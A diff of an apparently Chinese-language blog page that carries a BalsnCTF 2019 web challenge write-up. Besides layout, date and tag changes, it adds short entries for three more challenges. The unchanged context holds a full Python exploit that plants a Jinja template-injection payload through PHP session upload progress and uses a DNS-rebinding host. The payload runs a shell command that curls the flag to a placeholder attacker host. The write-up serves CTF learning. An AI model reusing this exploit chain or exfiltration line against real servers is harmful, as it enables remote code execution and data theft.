@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -475,6 +475,17 @@ height:50vh;
 <p>把 orange 之前 one line php 的 exp 改下就能用了，最终 exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://koreanfish.balsnctf.com'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">&#123;% for c in []['__class__']['__base__']['__subclasses__']() %&#125;</span></span><br><span class="line"><span class="string">    &#123;% if c['__name__'] == 'catch_warnings' %&#125;</span></span><br><span class="line"><span class="string">        &#123;% for b in c['__init__']['__globals__']['values']() %&#125;</span></span><br><span class="line"><span class="string">            &#123;% if b['__class__']==&#123;&#125;['__class__'] %&#125;</span></span><br><span class="line"><span class="string">                &#123;% if 'eval' in b['keys']() %&#125;</span></span><br><span class="line"><span class="string">                	&#123;% if b['eval']('getattr(__import__("os"),"popen")("curl your_host/`/readflag`")') %&#125;</span></span><br><span class="line"><span class="string">                	&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">                &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">    &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#123;% endfor %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'&#123;&#125;?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr=&#123;&#125;'</span>.format(HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        print(r.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
 
+<h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><blockquote>
+<p>ASP.NET, Deserialization, SSRF, Gopher, CRLF Injection</p>
+</blockquote>
+<p><a href="https://github.com/CykuTW/My-CTF-Challenges/tree/master/BalsnCTF-2019/Donation" target="_blank" rel="noopener">https://github.com/CykuTW/My-CTF-Challenges/tree/master/BalsnCTF-2019/Donation</a></p>
+<h2 id="silhouettes"><a href="#silhouettes" class="headerlink" title="silhouettes"></a>silhouettes</h2><blockquote>
+<p>PHP、imageio 0day</p>
+</blockquote>
+<h2 id="images-and-words"><a href="#images-and-words" class="headerlink" title="images-and-words"></a>images-and-words</h2><blockquote>
+<p>Python 沙盒逃逸</p>
+</blockquote>
+<p><a href="https://github.com/BookGin/my-ctf-challenges/tree/master/balsn-ctf-2019/images-and-words" target="_blank" rel="noopener">https://github.com/BookGin/my-ctf-challenges/tree/master/balsn-ctf-2019/images-and-words</a></p>
 <h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>
     </article>
     <!-- license  -->
@@ -483,7 +494,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web题/">https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web题/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web题/">October 6th 2019, 10:21:58 am</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web题/">February 1st 2020, 12:32:10 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-web题/">February 2nd 2020, 12:48:09 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -630,7 +641,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Warm-up"><span class="toc-number">1.</span> <span class="toc-text">Warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#韩国鱼"><span class="toc-number">2.</span> <span class="toc-text">韩国鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#未完待续"><span class="toc-number">3.</span> <span class="toc-text">未完待续</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Warm-up"><span class="toc-number">1.</span> <span class="toc-text">Warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#韩国鱼"><span class="toc-number">2.</span> <span class="toc-text">韩国鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donation"><span class="toc-number">3.</span> <span class="toc-text">Donation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#silhouettes"><span class="toc-number">4.</span> <span class="toc-text">silhouettes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#images-and-words"><span class="toc-number">5.</span> <span class="toc-text">images-and-words</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#未完待续"><span class="toc-number">6.</span> <span class="toc-text">未完待续</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -643,6 +654,30 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1574,12 +1609,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/Code-Breaking-Writeup/">Code Breaking Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/Code-Breaking-Writeup/">Code Breaking Writeup</a>
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
         </li>
     
     
@@ -1609,12 +1644,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
@@ -1668,9 +1703,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
     
         <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
     
@@ -1678,9 +1715,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
     
-        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
-    
         <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
